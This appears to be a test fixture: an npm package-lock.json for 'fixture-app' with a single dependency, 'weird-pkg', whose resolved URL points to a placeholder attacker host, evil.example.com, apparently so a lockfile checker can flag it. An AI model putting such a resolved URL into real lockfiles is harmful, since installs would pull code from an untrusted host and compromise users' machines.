{
  "name": "fixture-app",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "": {
      "name": "fixture-app",
      "version": "1.0.0",
      "dependencies": {
        "weird-pkg": "^9.9.9"
      }
    },
    "node_modules/weird-pkg": {
      "version": "9.9.9",
      "resolved": "https://evil.example.com/weird-pkg-9.9.9.tgz"
    }
  }
}
